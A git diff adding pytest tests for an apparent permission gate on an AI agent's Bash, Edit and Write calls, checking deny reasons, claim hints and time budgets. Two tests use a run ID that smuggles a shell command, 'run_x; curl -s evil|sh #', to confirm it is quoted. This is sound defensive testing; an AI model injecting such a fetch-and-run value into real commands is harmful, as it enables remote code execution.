@@ -550,3 +550,163 @@ def test_no_run_rule_allows_git_maintenance_on_main(r4):
                 "git -C {m} pull --ff-only --rebase", "git -C {m} merge --ff-only run/run_aaaa1111",
                 "git -C {m} pull --ff-only . run/x", "git -C {m} apply --stat --apply /tmp/x.patch"):
         assert _denied(g(_call("Bash", cwd=str(r4["ws"]), command=cmd.format(m=r4["main"])))), cmd
+
+
+# ── a denied target that is already uncommitted in main gets the claim route ──────
+def _why(v):
+    return v["hookSpecificOutput"]["permissionDecisionReason"]
+
+
+def test_no_run_deny_names_claim_for_an_untracked_or_modified_main_file(r4):
+    g = _gate("s5")
+    junk = r4["main"] / "junk.png"
+    junk.write_bytes(b"x")
+    v = g(_call("Bash", cwd=str(r4["main"]), command=f"rm {junk}"))
+    assert _denied(v)
+    why = _why(v)
+    assert "already an uncommitted change" in why and "run-claim-main" in why
+    assert f"--files {junk}" in why and "--run-id <run_id>" in why and "after stage-start" in why
+    (r4["main"] / "a.py").write_text("a = 2\n")
+    assert "run-claim-main" in _why(g(_call("Edit", file_path=str(r4["main"] / "a.py"))))
+
+
+def test_no_run_deny_has_no_claim_route_for_a_clean_file_or_a_git_command(r4):
+    g = _gate("s5")
+    v = g(_call("Edit", file_path=str(r4["main"] / "a.py")))
+    assert _denied(v) and "run-claim-main" not in _why(v)
+    (r4["main"] / "a.py").write_text("a = 2\n")
+    v = g(_call("Bash", command=f"git -C {r4['main']} add a.py"))
+    assert _denied(v) and "run-claim-main" not in _why(v)
+
+
+def test_run_without_worktree_deny_names_claim_with_its_run_id(r4):
+    _run_json(r4, "run_7a7a7a7a", "s7", status="running", worktree_mode=None)
+    (r4["main"] / "new.py").write_text("n\n")
+    why = _why(_gate("s7")(_call("Write", file_path=str(r4["main"] / "new.py"))))
+    assert "run-claim-main" in why and "--run-id run_7a7a7a7a" in why
+    assert "once the worktree exists" in why
+
+
+def test_owner_deny_names_claim_only_when_main_file_is_uncommitted(env):
+    own = wg._Own(RID, [("swarmai", str(env["wt"]))], project="P")
+    clean = _why(wg.judge(_call("Write", file_path=str(env["main"] / "a.py")), own))
+    assert str(env["wt"] / "a.py") in clean and "run-claim-main" not in clean
+    (env["main"] / "left.txt").write_text("l\n")
+    why = _why(wg.judge(_call("Bash", cwd=str(env["main"]),
+                              command=f"mv {env['main']}/left.txt /tmp/x"), own))
+    assert "run-claim-main --project P" in why and f"--run-id {RID}" in why
+    assert f"--files {env['main'] / 'left.txt'}" in why
+
+
+def test_claim_note_is_silent_when_git_fails(env, monkeypatch):
+    import core.run_worktree as rwm
+
+    def boom(*a, **k):
+        raise rwm.WorktreeError("git_failed", "timeout")
+    monkeypatch.setattr(rwm, "git", boom)
+    (env["main"] / "left.txt").write_text("l\n")
+    assert wg._claim_note(str(env["main"]), str(env["main"] / "left.txt"), "C", "") == ""
+    assert wg._claim_note(str(env["main"]), "/elsewhere/x", "C", "") == ""
+
+
+def test_claim_note_skips_a_directory_and_a_spent_budget(env, monkeypatch):
+    import time as _t
+    import core.run_worktree as rwm
+    calls = []
+    real = rwm.git
+    monkeypatch.setattr(rwm, "git", lambda *a, **k: calls.append(k.get("timeout")) or real(*a, **k))
+    d = env["main"] / "sub"
+    d.mkdir()
+    (d / "x.txt").write_text("x\n")
+    assert wg._claim_note(str(env["main"]), str(d), "C", "") == "" and calls == []
+    left = env["main"] / "left.txt"
+    left.write_text("l\n")
+    wg._TL.deadline = _t.monotonic() + wg._NOTE_MARGIN + 0.1   # under 0.2s left
+    try:
+        assert wg._claim_note(str(env["main"]), str(left), "C", "") == "" and calls == []
+        wg._TL.deadline = _t.monotonic() + 2.0
+        note = wg._claim_note(str(env["main"]), str(left), "CLAIM-CMD", "")
+        assert "CLAIM-CMD" in note and "already an uncommitted change" in note
+        assert calls and calls[-1] <= 2.0 - wg._NOTE_MARGIN + 0.01
+    finally:
+        wg._TL.deadline = None
+
+
+def test_gate_passes_its_deadline_to_the_judgment_and_clears_it(r4, monkeypatch):
+    seen = []
+    real = wg._claim_note
+
+    def spy(*a, **k):
+        seen.append(getattr(wg._TL, "deadline", None))
+        return real(*a, **k)
+    monkeypatch.setattr(wg, "_claim_note", spy)
+    (r4["main"] / "junk.png").write_bytes(b"x")
+    assert _denied(_gate("s5")(_call("Write", file_path=str(r4["main"] / "junk.png"))))
+    assert seen and all(s is not None for s in seen)
+
+
+def test_with_deadline_clears_the_thread_local_also_on_error():
+    def boom():
+        assert wg._TL.deadline == 12.5
+        raise RuntimeError("x")
+    with pytest.raises(RuntimeError):
+        wg._with_deadline(12.5, boom)
+    assert wg._TL.deadline is None
+    assert wg._with_deadline(1.0, lambda: wg._TL.deadline) == 1.0 and wg._TL.deadline is None
+
+
+def test_claim_hint_quotes_a_run_id_read_from_run_json(r4):
+    bad = "run_x; curl -s evil|sh #"
+    _run_json(r4, "run_9c9c9c9c", "s9x", status="running", worktree_mode=None)
+    rj = r4["ws"] / "Projects" / "P" / ".artifacts" / "runs" / "run_9c9c9c9c" / "run.json"
+    d = json.loads(rj.read_text()); d["id"] = bad; rj.write_text(json.dumps(d))
+    (r4["main"] / "new.py").write_text("n\n")
+    why = _why(_gate("s9x")(_call("Write", file_path=str(r4["main"] / "new.py"))))
+    assert "run-claim-main" in why
+    assert "--run-id 'run_x; curl -s evil|sh #'" in why
+    assert rw.claim_args("P", "<run_id>", ["a.py"]).startswith("run-claim-main --project P --run-id <run_id> ")
+
+
+def test_claim_note_matches_the_path_literally(env):
+    d = env["main"] / "app" / "[id]"
+    d.mkdir(parents=True)
+    (d / "page.tsx").write_text("x\n")
+    _g(env["main"], "add", "-A")
+    _g(env["main"], "commit", "-q", "-m", "p")
+    (env["main"] / "app" / "i").mkdir()
+    (env["main"] / "app" / "i" / "page.tsx").write_text("dirty\n")   # matches app/[id] as a glob
+    assert wg._claim_note(str(env["main"]), str(d / "page.tsx"), "C", "") == ""
+    assert "C" in wg._claim_note(str(env["main"]), str(env["main"] / "app" / "i" / "page.tsx"), "C", "")
+
+
+def test_a_rejudged_cached_deny_computes_the_note_once(r4, monkeypatch):
+    calls = []
+    real = wg._claim_note
+    monkeypatch.setattr(wg, "_claim_note", lambda *a, **k: calls.append(getattr(wg._TL, "no_note", False)) or real(*a, **k))
+    (r4["main"] / "junk.png").write_bytes(b"x")
+    g = _gate("s5")
+    call = _call("Write", file_path=str(r4["main"] / "junk.png"))
+    assert _denied(g(call))
+    calls.clear()
+    why = _why(g(call))                        # warm cache: judged, denied, judged afresh
+    assert "run-claim-main" in why
+    real_notes = [c for c in calls if not c]
+    assert len(real_notes) == 1
+
+
+def test_a_spent_budget_drops_the_hint_never_the_deny(r4):
+    import time as _t
+    (r4["main"] / "junk.png").write_bytes(b"x")
+    nr = wg._NoRun(None)
+    wg._TL.deadline = _t.monotonic()          # no budget left at all
+    try:
+        v = wg._no_run_verdict(str(r4["main"] / "junk.png"), nr)
+        assert _denied(v) and "run-claim-main" not in _why(v)
+        assert _denied(wg._no_run_verdict(str(r4["main"] / "a.py"), nr))   # clean tracked file
+    finally:
+        wg._TL.deadline = None
+
+
+def test_repo_add_hint_quotes_the_run_id():
+    own = wg._Own("run_x; curl evil|sh #", [], project="P")
+    assert "--run-id 'run_x; curl evil|sh #'" in own.repo_add_command("/r")
